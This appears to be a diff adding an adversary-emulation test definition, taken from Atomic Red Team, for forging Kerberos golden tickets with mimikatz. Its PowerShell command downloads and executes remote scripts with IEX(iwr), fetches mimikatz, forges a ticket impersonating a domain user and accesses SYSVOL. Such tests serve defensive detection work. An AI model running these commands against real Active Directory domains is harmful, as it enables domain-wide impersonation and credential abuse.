@@ -1,0 +1,108 @@
+- id: 9726592a-dabc-4d4d-81cd-44070008b3af
+  name: Crafting Active Directory golden tickets with mimikatz
+  description: 'Once the hash of the special krbtgt user is retrieved it is possible
+    to craft Kerberos Ticket Granting Ticket impersonating any user in the Active
+    Directory domain.
+
+    This test crafts a Golden Ticket and then performs an SMB request with it for
+    the SYSVOL share, thus triggering a service ticket request (event ID 4769).
+
+    The generated ticket is injected in a new empty Windows session and discarded
+    after, so it does not pollute the current Windows session.'
+  tactic: credential-access
+  technique:
+    attack_id: T1558.001
+    name: 'Steal or Forge Kerberos Tickets: Golden Ticket'
+  platforms:
+    windows:
+      psh:
+        command: '$mimikatz_path = cmd /c echo PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe;
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"
+          -UseBasicParsing); $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases";
+          $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
+          | where-object { $_.endswith(".zip") }; $mimikatz_exe = cmd /c echo PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe;
+          $basePath = Split-Path $mimikatz_exe | Split-Path; Invoke-FetchFromZip $zipUrl
+          "x64/mimikatz.exe" $basePath; fi; Remove-Item $env:TEMP\golden.bat -ErrorAction
+          Ignore; Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore; # get current
+          domain SID if default was used; $domain_sid = "S-1-5-21-DEFAULT"; If ($domain_sid
+          -Match "DEFAULT") {; # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60;
+          $domain = gwmi Win32_ComputerSystem | Select -Expand Domain; $krbtgtSID
+          = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;
+          $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf(''-'')); };
+          # create batch file with commands to run in a separate "runas /netonly"
+          session; # so we don''t purge Kerberos ticket from the current Windows session;
+          # its output goes to golden.txt temp file, because we cannot capture "runas
+          /netonly" output otherwise; @"; >%TEMP%\golden.txt 2>&1 (; echo Purge existing
+          tickets and create golden ticket:; klist purge; PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
+          "kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
+          /user:goldenticketfakeuser /ptt" "exit"; echo.; echo Requesting SYSVOL:;
+          dir \\%userdnsdomain%\SYSVOL; echo.; echo Tickets after requesting SYSVOL:;
+          klist; echo.; echo End of Golden Ticket attack; ); "@ -Replace "DOMAIN_SID",
+          $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat; # run batch file
+          in a new empty session (password and username do not matter); echo "foo"
+          | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null; # wait until
+          the output file has logged the entire attack; do {; Start-Sleep 1 # wait
+          a bit so the output file has time to be created; Get-Content -Path "$env:TEMP\golden.txt"
+          -Wait | ForEach-Object {; if ($_ -match ''End of Golden Ticket attack'')
+          { break }; }; } while ($false) # dummy loop so that ''break'' can be used;
+          # show output from new empty session; Get-Content $env:TEMP\golden.txt;
+          # cleanup temp files; Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore;
+          Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore'
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - t1558.001
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      domain_sid:
+        description: SID of the targeted domain, if you keep default it will automatically
+          get the current domain SID
+        type: string
+        default: S-1-5-21-DEFAULT
+      domain:
+        description: Targeted Active Directory domain FQDN
+        type: string
+        default: '%userdnsdomain%'
+      account:
+        description: Account to impersonate
+        type: string
+        default: goldenticketfakeuser
+      krbtgt_aes256_key:
+        description: Krbtgt AES256 key (you will need to set to match your krbtgt
+          key for your domain)
+        type: string
+        default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
+      mimikatz_path:
+        description: Mimikatz windows executable
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
+    dependencies:
+    - description: 'Mimikatz executor must exist on disk and at specified location
+        (#{mimikatz_path})
+
+        '
+      prereq_command: '$mimikatz_path = cmd /c echo #{mimikatz_path}
+
+        if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\
+        New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction\
+        \ Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"\
+        \ -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\
+        \n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url\
+        \ | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n\
+        $basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl\
+        \ \"x64/mimikatz.exe\" $basePath\n"
+    technique_created: '2020-02-11T19:13:33.643Z'
+    atomic_guid: 9726592a-dabc-4d4d-81cd-44070008b3af
+    import_timestamp: '2025-06-24T11:15:06.674849Z'
